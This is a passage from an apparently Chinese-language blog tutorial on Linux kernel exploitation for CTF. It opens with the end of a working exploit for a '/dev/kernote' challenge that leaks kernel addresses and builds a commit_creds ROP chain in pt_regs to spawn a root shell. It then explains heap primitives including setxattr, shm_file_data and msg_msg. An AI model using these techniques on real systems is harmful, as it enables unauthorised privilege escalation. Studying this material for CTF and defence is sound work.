class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">ldt_cracker</span><span class="params">(<span class="type">void</span> *cracker_args)</span> &#123;</span><br><span class="line">    <span class="type">int</span> index = *(<span class="type">int</span> *) cracker_args;</span><br><span class="line">    chunk_add(index);</span><br><span class="line">    chunk_set(index);</span><br><span class="line">    chunk_delete(index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">ldt_momdifier</span><span class="params">(<span class="type">void</span> *momdifier_args, <span class="type">size_t</span> page_offset_base)</span> &#123;</span><br><span class="line">    chunk_edit(page_offset_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">mem_finder</span><span class="params">(<span class="type">void</span> *finder_args, <span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LDT_BUF_SIZE; i += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="type">size_t</span> val = *(<span class="type">size_t</span> *) (buf + i);</span><br><span class="line">        <span class="keyword">if</span> (val &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; !((val ^ SECONDARY_STARTUP_64) &amp; <span class="number">0xFFF</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    kernote_fd = open(<span class="string">&quot;/dev/kernote&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (kernote_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kernote.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> page_offset_base = ldt_guessing_direct_mapping_area(ldt_cracker, (<span class="type">int</span>[]) &#123;<span class="number">0</span>&#125;, ldt_momdifier, <span class="literal">NULL</span>, <span class="number">0x4000000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] page_offset_base: %p\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_offset = ldt_seeking_memory(ldt_momdifier, <span class="literal">NULL</span>, page_offset_base, mem_finder, <span class="literal">NULL</span>, <span class="literal">true</span>) - SECONDARY_STARTUP_64;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    add_rsp_0x198_ret += kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    ldt_cracker((<span class="type">int</span>[]) &#123;<span class="number">1</span>&#125;);</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    chunk_edit(add_rsp_0x198_ret);</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, init_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, commit_creds;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, 0x5555555555555555;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, 0x6666666666666666;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0x7777777777777777;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, 0x8888888888888888;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, 0x9999999999999999;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8, 0xaaaaaaaaaaaaaaaa;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rcx, 0xbbbbbbbbbbbbbbbb;&quot;</span></span><br><span class="line">            <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall&quot;</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="pt_regs-与系统调用相关">pt_regs 与系统调用相关</h1>
<p>linux 系统调用的时候会把所有寄存器依次压入内核栈中形成 pt_regs
结构体，之后就继续执行内核代码。 pt_regs 结构体定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">pt_regs</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>在内核栈上的结构如下： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1c4de9083a51c6e8432e7da2bd6fc6fe.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>由于系统调用前的寄存器的值是用户可控的，这就等于控制了内核栈低区域，也就可以在其中写入
ROP 。之后只需要控制程序执行流，利用一个 <code>add rsp, val</code> 的
gadget 将栈迁移到 布置在 pt_regs 结构体上的 ROP
上就可以完成提权操作。</p>
<p>内核主线在 这个 <a class="link" 
 href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14" >commit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
中为系统调用栈添加了一个偏移值，这意味着 <code>pt_regs</code>
与我们触发劫持内核执行流时的栈间偏移值不再是固定值，这个保护的开启需要
<code>CONFIG_RANDOMIZE_KSTACK_OFFSET=y</code> （默认开启）</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c</span><br><span class="line">index <span class="number">4</span>efd39aacb9f2.<span class="number">.7</span>b2542b13ebd9 <span class="number">100644</span></span><br><span class="line">--- a/arch/x86/entry/common.c</span><br><span class="line">+++ b/arch/x86/entry/common.c</span><br><span class="line">@@ <span class="number">-38</span>,<span class="number">6</span> +<span class="number">38</span>,<span class="number">7</span> @@</span><br><span class="line"> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line"> __visible noinstr <span class="type">void</span> <span class="title function_">do_syscall_64</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> nr, <span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line"> &#123;</span><br><span class="line">+    add_random_kstack_offset();</span><br><span class="line">     nr = syscall_enter_from_user_mode(regs, nr);</span><br><span class="line"></span><br><span class="line">     instrumentation_begin();</span><br></pre></td></tr></table></figure></div>
<h1 id="setxattr-相关">setxattr 相关</h1>
<p>setxattr 并非一个内核结构体，而是一个系统调用，但在 kernel pwn
当中这同样是一个十分有用的系统调用，利用这个系统调用，我们可以进行内核空间中任意大小的
object 的分配。</p>
<h2 id="任意大小-object-分配gfp_kernel-释放">任意大小 object
分配（GFP_KERNEL）&amp; 释放</h2>
<p>观察 setxattr 源码，发现如下调用链：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">SYS_setxattr</span>()</span><br><span class="line">    <span class="built_in">path_setxattr</span>()</span><br><span class="line">        <span class="built_in">setxattr</span>()</span><br></pre></td></tr></table></figure></div>
<p>其中 setattr 函数关键逻辑如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = <span class="built_in">kvmalloc</span>(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">copy_from_user</span>(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">kvfree</span>(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="修改结构体">修改结构体</h3>
<p>虽然 <code>setxattr</code> 可以分配任意大小的内核空间 object
，但是分配完之后就立即被释放了，起不到利用效果。因此这里需要配合
userfaultfd 将执行过程卡在 <code>copy_from_user</code> 处。</p>
<p>不过在 ctf 中的 kernel pwn 环境中由于受其它进程受影响较小，可以直接用
<code>setxattr</code> 来 UAF 修改结构体的内容。</p>
<p>如果有其它同样大小结构体在不会修改相关字段的前提下可以一边用
<code>setxattr</code>
来修改结构体一边喷射结构体占用修改过的结构体，实现堆喷的效果。 ##
simple_xattr (GFP_KERNEL) 该结构常用于存储 in-memory filesystems （例如
<code>tmpfs</code>）的扩展属性（xattrs - extended
attribute），每个文件的 <code>simple_xattr</code> 以
<code>list_head</code> 链表存起来。分配函数是
<code>simple_xattr_alloc()</code>，用户可控
<code>simple_xattr-&gt;value</code>，分配大小是 <code>kmalloc-32</code>
到很大。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">simple_xattr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> value[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>缺点：<code>simple_xattr</code> 不能修改，当对它进行编辑时，会把旧的
<code>simple_xattr</code> 从链表unlink ，然后分配新的
<code>simple_xattr</code> 并链接上去。所以通过伪造 <code>size</code> 和
<code>next</code>
指针，无法构造越界写或任意地址写。还有个问题就是非特权用户无法设置
<code>simple_xattr</code>，但是只要系统支持 user namespace 即可。 #
shm_file_data 与共享内存相关</p>
<p><strong>进程间通信</strong>（Inter-Process
Communication，IPC）即不同进程间的数据传递问题，在 Linux 当中有一种 IPC
技术名为<strong>共享内存</strong>，在用户态中我们可以通过
<code>shmget</code>、<code>shmat</code>、<code>shmctl</code>、<code>shmdt</code>
这四个系统调用操纵共享内存。</p>
<h2
id="shm_file_datakmalloc-32gfp_kernel">shm_file_data（kmalloc-32|GFP_KERNEL）</h2>
<p>该结构体定义于 <code>/ipc/shm.c</code> 中，如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h3 id="分配shmat-系统调用">分配：shmat 系统调用</h3>
<p>我们知道使用 <code>shmget</code>
系统调用可以获得一个共享内存对象，随后要使用 <code>shmat</code>
系统调用将共享内存对象映射到进程的地址空间，在该系统调用中调用了
<code>do_shmat()</code> 函数，注意到如下逻辑：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    file-&gt;private_data = sfd;</span><br></pre></td></tr></table></figure></div>
<p>即在调用 <code>shmat</code> 系统调用时会创建一个
<code>shm_file_data</code> 结构体，最后会存放在共享内存对象文件的
private_data 域中。</p>
<p>使用方法如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> shm_id = shmget(<span class="number">114514</span>, <span class="number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);</span><br><span class="line"><span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] shmget failed.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *shm_addr = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (shm_addr &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] shmat failed.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="释放shmdt-系统调用">释放：shmdt 系统调用</h3>
<p>我们知道使用 <code>shmdt</code>
系统调用用以断开与共享内存对象的连接，观察其源码，发现其会调用
<code>ksys_shmdt()</code> 函数，注意到如下调用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYS_shmdt()</span><br><span class="line">    ksys_shmdt()</span><br><span class="line">        do_munmap()</span><br><span class="line">            remove_vma_list()</span><br><span class="line">                remove_vma()</span><br></pre></td></tr></table></figure></div>
<p>其中有着这样一条代码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> vm_area_struct *<span class="title function_">remove_vma</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">next</span> =</span> vma-&gt;vm_next;</span><br><span class="line"></span><br><span class="line">    might_sleep();</span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;close)</span><br><span class="line">        vma-&gt;vm_ops-&gt;close(vma);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>
<p>在这里调用了该 <code>vma</code> 的 <code>vm_ops</code> 对应的
<code>close</code> 函数，我们将目光重新放回共享内存对应的
<code>vma</code> 的初始化的流程当中，在 <code>shmat()</code>
中注意到如下逻辑：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">char</span> __user *shmaddr, <span class="type">int</span> shmflg,</span></span><br><span class="line"><span class="params">          ulong *raddr, <span class="type">unsigned</span> <span class="type">long</span> shmlba)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">sfd = kzalloc(<span class="keyword">sizeof</span>(*sfd), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!sfd) &#123;</span><br><span class="line">        fput(base);</span><br><span class="line">        <span class="keyword">goto</span> out_nattch;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file = alloc_file_clone(base, f_flags,</span><br><span class="line">              is_file_hugepages(base) ?</span><br><span class="line">                &amp;shm_file_operations_huge :</span><br><span class="line">                &amp;shm_file_operations);</span><br></pre></td></tr></table></figure></div>
<p>在这里调用了 <code>alloc_file_clone()</code> 函数，其会调用
<code>alloc_file()</code> 函数将第三个参数赋值给新的 file 结构体的 f_op
域，在这里是 <code>shm_file_operations</code> 或
<code>shm_file_operations_huge</code>，定义于 <code>/ipc/shm.c</code>
中，如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * shm_file_operations_huge is now identical to shm_file_operations,</span></span><br><span class="line"><span class="comment"> * but we keep it distinct for the sake of is_file_shm_hugepages().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations_huge</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>在这里对于关闭 shm 文件，对应的是 <code>shm_release</code>
函数，如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">shm_release</span><span class="params">(<span class="keyword">struct</span> inode *ino, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span> =</span> shm_file_data(file);</span><br><span class="line"></span><br><span class="line">    put_ipc_ns(sfd-&gt;ns);</span><br><span class="line">    fput(sfd-&gt;file);</span><br><span class="line">    shm_file_data(file) = <span class="literal">NULL</span>;</span><br><span class="line">    kfree(sfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>即当我们进行 <code>shmdt</code> 系统调用时便可以释放
<code>shm_file_data</code> 结构体。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (shmdt(shm_addr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] shmdt failed.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="数据泄露-3">数据泄露</h3>
<ul>
<li><p>内核 .text 段地址</p>
<p><code>shm_file_data</code> 的 <code>ns</code> 域 和
<code>vm_ops</code> 域皆指向内核的 .text
段中，若是我们能够泄露这两个指针便能获取到内核 .text 段基址。</p>
<ul>
<li><code>ns</code> 字段通常指向 <code>init_ipc_ns</code> 。</li>
<li><code>vm_ops</code> 字段通常指向 <code>shmem_vm_ops</code> 。</li>
</ul></li>
<li><p>内核线性映射区（ direct mapping area）</p>
<p><code>shm_file_data</code> 的 file 域为一个 file
结构体，位于线性映射区中，若能泄露 file 域则同样能泄漏出内核的“堆上地址”
。</p></li>
</ul>
<h1 id="system-v-消息队列内核中的菜单堆">system V
消息队列：内核中的“菜单堆”</h1>
<p>在 Linux kernel 中有着一组 system V 消息队列相关的系统调用：</p>
<ul>
<li>msgget：创建一个消息队列</li>
<li>msgsnd：向指定消息队列发送消息</li>
<li>msgrcv：从指定消息队列接接收消息</li>
</ul>
<p>当我们创建一个消息队列时，在内核空间中会创建一个
<code>msg_queue</code> 结构体，其表示一个消息队列：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="type">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="type">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="type">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>
<h2 id="msg_msg-msg_msgseg近乎任意大小的对象分配">msg_msg &amp;
msg_msgseg：近乎任意大小的对象分配</h2>
<p>当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message
时，在内核空间中会创建这样一个结构体：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">	<span class="type">long</span> m_type;</span><br><span class="line">	<span class="type">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><code>msg_queue</code> 和 <code>msg_msg</code> 构成双向链表。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/820d289e638b97d5ec9f6f7a7adc1043.png"
                     
alt="在这里插入图片描述" 
                > 虽然 <code>msg_queue</code>
的大小基本上是固定的，但是 <code>msg_msg</code>
作为承载消息的本体<strong>其大小是可以随着消息大小的改变而进行变动的</strong>，去除掉
msg_msg 结构体本身的 0x30 字节的部分（或许可以称之为
header）<strong>剩余的部分都用来存放用户数据</strong>，因此内核分配的
object 的大小是跟随着我们发送的 message 的大小进行变动的</p>
<p>而当我们单次发送 <strong>大于【一个页面大小 - header size】</strong>
大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体，其与
<code>msg_msg</code> 之间形成如下单向链表结构： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ec39613bce4e75854d501b244f4be905.png"
                     
alt="在这里插入图片描述" 
                > 同样地，单个 <code>msg_msgseg</code>
的大小最大为一个页面大小，因此超出这个范围的消息内核会额外补充上更多的
<code>msg_msgseg</code> 结构体。</p>
<h3
id="分配gfp_kernel_accountmsgsnd-系统调用">分配（GFP_KERNEL_ACCOUNT）：msgsnd
系统调用</h3>
<p>当我们在消息队列上发送一个 message 时，<code>do_msgsnd</code>
首先会调用 <code>load_msg</code> 将该 message
拷贝到内核中。<strong>注意这里对 <code>msgsz</code> 和
<code>mtype</code> 的检查。</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">long</span> mtype, <span class="type">void</span> __user *mtext,</span></span><br><span class="line"><span class="params">		<span class="type">size_t</span> msgsz, <span class="type">int</span> msgflg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">	DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">	ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="type">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span 